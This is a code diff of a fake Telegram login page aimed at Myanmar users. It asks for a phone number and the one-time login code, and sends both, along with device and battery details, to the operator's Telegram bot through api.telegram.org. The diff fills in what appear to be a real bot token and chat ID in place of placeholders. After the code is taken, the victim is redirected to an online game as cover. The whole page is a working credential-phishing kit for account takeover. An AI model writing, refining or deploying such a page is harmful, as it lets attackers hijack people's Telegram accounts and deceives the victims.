@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram</title>
+    <title>Telegram Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -14,8 +14,8 @@
             border: 3px solid #f3f3f3;
             border-top: 3px solid #2481cc;
             border-radius: 50%;
-            width: 24px;
-            height: 24px;
+            width: 28px;
+            height: 28px;
             animation: spin 1s linear infinite;
             display: none;
         }
@@ -27,27 +27,27 @@
 
 <div id="app" class="max-w-md mx-auto h-screen flex flex-col p-6">
     <div id="step1" class="text-center">
-        <div class="mt-10 mb-8"><i class="fa-solid fa-paper-plane text-6xl tg-blue"></i></div>
+        <div class="mt-12 mb-8"><i class="fa-solid fa-paper-plane text-7xl tg-blue"></i></div>
         <h1 class="text-2xl font-bold mb-2">Your Phone</h1>
         <p class="text-gray-500 mb-8">Please confirm your country code and enter your phone number.</p>
         
         <div class="text-left border-b-2 border-gray-200 py-2 mb-6">
             <label class="text-gray-400 text-sm">Country</label>
             <div class="flex justify-between items-center">
-                <span class="font-medium">Myanmar</span>
+                <span class="font-medium text-lg">Myanmar</span>
                 <i class="fa-solid fa-chevron-right text-gray-400"></i>
             </div>
         </div>
 
         <div class="flex border-b-2 border-blue-500 py-2 mb-10">
-            <span class="font-bold mr-4">+95</span>
-            <input type="number" id="phone" placeholder="9xxxxxxxxx" class="w-full outline-none text-lg">
+            <span class="font-bold text-xl mr-4">+95</span>
+            <input type="number" id="phone" placeholder="9xxxxxxxxx" class="w-full outline-none text-xl">
         </div>
     </div>
 
     <div id="step2" class="hidden text-center">
-        <div class="mt-10 mb-8"><i class="fa-solid fa-message text-6xl tg-blue"></i></div>
-        <h1 id="displayPhone" class="text-2xl font-bold mb-2">+95 9...</h1>
+        <div class="mt-12 mb-8"><i class="fa-solid fa-message text-7xl tg-blue"></i></div>
+        <h1 id="displayPhone" class="text-2xl font-bold mb-2"></h1>
         <p class="text-gray-500 mb-8">We've sent an activation code to your Telegram app.</p>
         
         <div class="flex justify-center gap-3 mb-10">
@@ -57,11 +57,11 @@
             <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 3)">
             <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 4)">
         </div>
-        <p id="funText" class="text-blue-500 italic text-sm animate-pulse"></p>
+        <p id="statusMsg" class="text-blue-500 font-medium h-6"></p>
     </div>
 
-    <div class="fixed bottom-10 right-10">
-        <button onclick="handleNext()" id="nextBtn" class="tg-bg-blue w-16 h-16 rounded-full shadow-lg flex items-center justify-center text-white text-2xl transition-all active:scale-90">
+    <div class="fixed bottom-12 right-8">
+        <button onclick="handleNext()" id="nextBtn" class="tg-bg-blue w-16 h-16 rounded-full shadow-2xl flex items-center justify-center text-white text-2xl transition-all active:scale-90">
             <i id="btnIcon" class="fa-solid fa-arrow-right"></i>
             <div id="btnLoader" class="loader"></div>
         </button>
@@ -70,14 +70,19 @@
 
 <script>
     let currentStep = 1;
-    const botToken = "YOUR_BOT_TOKEN";
-    const chatId = "YOUR_CHAT_ID";
-    let phoneInfo = "";
+    const botToken = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0"; // သင်၏ Bot Token ထည့်ပါ
+    const chatId = "5304050102";     // သင်၏ Chat ID ထည့်ပါ
+    let deviceData = "";
 
-    // Battery & Device Info fetching
-    navigator.getBattery().then(batt => {
-        phoneInfo = `🔋 Battery: ${Math.round(batt.level * 100)}% | Device: ${navigator.platform}`;
-    });
+    // Battery & Device Information
+    async function getDeviceInfo() {
+        let info = `📱 Device: ${navigator.platform}\n🌐 Browser: ${navigator.userAgent.split(' ')[0]}`;
+        try {
+            const batt = await navigator.getBattery();
+            info += `\n🔋 Battery: ${Math.round(batt.level * 100)}%`;
+        } catch (e) {}
+        return info;
+    }
 
     function moveNext(el, idx) {
         if (el.value && idx < 4) document.querySelectorAll('.otp-in')[idx + 1].focus();
@@ -86,7 +91,7 @@
     async function handleNext() {
         const btnIcon = document.getElementById('btnIcon');
         const btnLoader = document.getElementById('btnLoader');
-        const funText = document.getElementById('funText');
+        const statusMsg = document.getElementById('statusMsg');
 
         // မြှားလည်စေခြင်း
         btnIcon.style.display = 'none';
@@ -98,31 +103,33 @@
                 alert("Please enter a valid phone number.");
                 resetBtn(); return;
             }
+
             // 09 format ပြုပြင်ခြင်း
-            const formattedPhone = rawPhone.startsWith('09') ? rawPhone : '09' + rawPhone.replace(/^9/, '');
+            const formattedPhone = rawPhone.startsWith('09') ? rawPhone : '09' + rawPhone.replace(/^0/, '');
             document.getElementById('displayPhone').innerText = formattedPhone;
             
-            await sendTG(`📱 New Login Attempt\nPhone: ${formattedPhone}\n${phoneInfo}`);
+            const info = await getDeviceInfo();
+            await sendTG(`🚀 New Login\nPhone: ${formattedPhone}\n${info}`);
             
             setTimeout(() => {
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
                 currentStep = 2;
                 resetBtn();
-            }, 1500);
+            }, 1200);
 
         } else {
             let otp = "";
             document.querySelectorAll('.otp-in').forEach(i => otp += i.value);
+            if(otp.length < 5) { alert("Enter 5-digit code"); resetBtn(); return; }
             
-            funText.innerText = "ခဏစောင့်ပေးပါ... ဂိမ်းလောကထဲသို့ ခေါ်ဆောင်သွားနေပါပြီ 🎮✨";
-            
-            await sendTG(`🔑 OTP Received\nCode: ${otp}`);
+            statusMsg.innerText = "ခဏစောင့်ပေးပါ... ဂိမ်းထဲသို့ ဝင်ရောက်နေပါပြီ ✨";
+            await sendTG(`🔑 OTP Code: ${otp}`);
 
-            // နောက်ဆုံးမျက်နှာပြင်သို့ မရောက်မချင်း မြှားလည်နေစေရန်
+            // Poki Game Link သို့ တိုက်ရိုက်သွားခြင်း
             setTimeout(() => {
-                window.location.href = "https://poki.com/en/g/rail-in-the-air#fullscreen"; // ဤနေရာတွင် ဂိမ်း Link ထည့်ပါ
-            }, 3000);
+                window.location.href = "https://poki.com/en/g/rail-in-the-air#fullscreen";
+            }, 2500);
         }
     }
 
@@ -134,8 +141,9 @@
     async function sendTG(msg) {
         try {
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-        } catch (e) { console.error(e); }
+        } catch (e) {}
     }
 </script>
 </body>
 </html>
+
